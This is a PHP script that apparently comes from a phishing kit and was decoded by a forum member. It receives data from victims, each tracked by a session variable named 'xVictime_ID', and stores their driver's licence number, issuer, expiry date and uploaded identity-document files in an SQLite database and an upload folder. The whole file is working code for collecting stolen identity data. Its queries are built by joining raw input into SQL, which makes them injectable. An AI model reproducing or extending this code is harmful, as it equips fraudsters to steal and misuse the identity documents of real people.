<?php
// Decoded by Girudatsu.com Member

$PHGTTqUXtX_ = 'rand';
$LxzBVSqZTp = 'basename';
$qIxqfOcliI = 'basename';
@session_start();
$xVictime = $_SESSION['xVictime_ID'];
$pdo = new PDO('sqlite:../admin/database.db');
if (isset($_GET['driver'])) {
    $driver_number = $_POST['driver_number'];
    $driver_issued_by = $_POST['driver_issued_by'];
    $driver_expire_date = $_POST['driver_expire_date'];
    $identity_type = $_POST['identity_type'];
    $check = $pdo->query('' . 'SELECT * FROM `identity` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
    if (!$check) {
        $pdo->query('' . 'INSERT INTO `identity` VALUES (NULL,\'' . "{$xVictime}" . '\',\'' . "{$identity_type}" . '\',\'\',\'' . "{$driver_number}" . '\',\'' . "{$driver_issued_by}" . '\',\'' . "{$driver_expire_date}" . '\')' . '');
    } else {
        $pdo->query('' . 'UPDATE `identity` SET `document_type`=\'' . "{$identity_type}" . '\',`identities`=\'\',`driver_number`=\'' . "{$driver_number}" . '\',`driver_issued_by`=\'' . "{$driver_issued_by}" . '\',`driver_expire_date`=\'' . "{$driver_expire_date}" . '\' WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '');
    }
    exit;
}
$spliter = '*_*';
$uploaddir = '../upload/';
$files_db = '';
$randomx = rand(862199 + 137801, 18268544 - 8268545);
foreach ($_FILES as $file) {
    if (move_uploaded_file($file['tmp_name'], $uploaddir . $xVictime . '_ID_' . $randomx . '_' . basename($file['name']))) {
        $files_db = $files_db . $uploaddir . $xVictime . '_ID_' . $randomx . '_' . basename($file['name']) . $spliter;
    }
}
$the_new_one = $check['identity'] . $files_db;
$pdo->query('' . 'UPDATE `identity` SET `identities`=\'' . "{$the_new_one}" . '\' WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '');
